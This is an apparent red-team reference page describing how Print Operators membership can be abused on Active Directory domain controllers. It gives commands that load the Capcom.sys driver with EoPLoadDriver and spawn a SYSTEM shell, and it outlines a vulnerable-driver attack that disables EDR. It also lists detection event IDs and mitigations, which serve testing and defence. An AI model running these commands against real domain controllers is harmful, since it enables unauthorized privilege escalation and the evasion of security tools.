---
title: "Attack #52 — Abusing Print Operators Group"
description: "whoami /priv"
category: active-directory
tags: ["active-directory", "privilege-escalation"]
tools: ["PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Six/🟣 Attack #52 — Abusing Print Operators Group.md"
---
# 🟣 Attack #52 — Abusing Print Operators Group

***

## 📖 How It Works

**Print Operators** can log on to Domain Controllers and manage printers. More importantly, they have the `SeLoadDriverPrivilege` — the ability to **load kernel drivers** into the operating system. This can be abused to load a malicious driver that grants SYSTEM access or disables security controls.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Membership in Print Operators** | Provides SeLoadDriverPrivilege on DCs |

***

## 💻 Full Commands

```powershell
# ── Verify privilege ──────────────────────────────────────────────────────────
whoami /priv
# SeLoadDriverPrivilege        Load and unload device drivers    Enabled

# ── EoPLoadDriver exploit (load Capcom.sys for kernel execution) ──────────────
.\EoPLoadDriver.exe System\CurrentControlSet\MyDriver .\Capcom.sys
.\ExploitCapcom.exe
# Spawns SYSTEM shell

# ── Alternative: load vulnerable driver for BYOVD attack ─────────────────────
# Bring Your Own Vulnerable Driver — load a signed but vulnerable driver
# Then exploit it for kernel-level code execution
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4672** | Security Log | SeLoadDriverPrivilege assigned |
| **7045** | System Log | Driver loaded |
| **Sysmon 6** | Sysmon | Driver loaded — filter for non-standard drivers |

***

## 🔗 Attack Chain Context

```
[Print Operators] ──→ SeLoadDriverPrivilege → load kernel driver → SYSTEM
         │
         ├──→ 🔗 Kernel driver → disable EDR/AV → undetected persistence
         └──→ 💀 Defeated by: empty Print Operators group, driver signing enforcement
```

***

> ✅ **Attack #52 — Print Operators complete.**
